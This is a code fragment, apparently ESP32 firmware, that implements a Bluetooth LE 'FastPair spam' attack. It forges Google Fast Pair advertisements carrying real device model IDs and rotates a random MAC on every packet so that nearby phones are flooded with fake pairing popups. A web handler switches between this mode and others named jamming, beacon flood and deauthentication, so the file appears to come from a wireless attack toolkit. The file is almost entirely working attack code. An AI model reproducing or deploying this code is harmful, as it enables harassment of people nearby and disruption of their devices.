void btSpamLoop() {
  if (!isBTSpamming || !bleInited) return;
  if (millis() - lastBTSpamUpdate < 100) return;  // 100ms per packet
  lastBTSpamUpdate = millis();

  // Stop previous
  if (isAdvRunning) { esp_ble_gap_stop_advertising(); delay(5); isAdvRunning = false; }

  // Rotate MAC every packet (essential for FastPair!)
  setRandomMAC();
  delay(5);

  uint8_t advData[31];
  memset(advData, 0, 31);

  // Pick a random real device model
  int idx = random(numModels);
  uint32_t modelId = fastPairModels[idx];
  const char* deviceName = fastPairNames[idx];

  // ===== Google FastPair Packet (Proper Format!) =====
  // Flags (3 bytes)
  advData[0] = 0x02;  // Length
  advData[1] = 0x01;  // Type: Flags
  advData[2] = 0x06;  // LE General Discoverable + BR/EDR Not Supported

  // Service Data (Google FastPair)
  // Format: Len | Type(0x16) | UUID(2 bytes LE) | ModelID(3 bytes)
  advData[3] = 0x06;  // Length = 6 (1 type + 2 UUID + 3 model ID)
  advData[4] = 0x16;  // Type: Service Data
  advData[5] = 0x2F;  // UUID low byte (0xFE2F)
  advData[6] = 0xFE;  // UUID high byte

  // Model ID (3 bytes, big endian)
  advData[7] = (modelId >> 16) & 0xFF;
  advData[8] = (modelId >> 8) & 0xFF;
  advData[9] = modelId & 0xFF;

  // Complete Local Name
  int nameLen = strlen(deviceName);
  advData[10] = nameLen + 1;  // Length = name + type byte
  advData[11] = 0x09;         // Type: Complete Local Name
  memcpy(&advData[12], deviceName, nameLen);

  // Set raw adv data
  advDataReady = false;
  esp_ble_gap_config_adv_data_raw(advData, 31);

  // Wait for data set
  int w = 0;
  while (!advDataReady && w < 50) { delay(1); w++; }

  // Start advertising
  isAdvRunning = false;
  esp_ble_gap_start_advertising(&ble_adv_params);

  btSpamCount++;

  // Print debug every 50 packets
  if (btSpamCount % 50 == 0) {
    Serial.printf("[BT] Sent %d FastPair packets | Model: 0x%06X (%s)\n", btSpamCount, modelId, deviceName);
  }
}

void handleBTSpam() {
  String action = server.arg("action");
  if (action == "start") {
    if (isJamming) { isJamming=false; stopJamming(); }
    if (isBeaconing) stopBeaconFlood();
    if (isDeauthing) stopDeauth();
    startBTSpamMode();
  } else stopBTSpamMode();
  server.sendHeader("Location", "/", true); server.send(302);
}

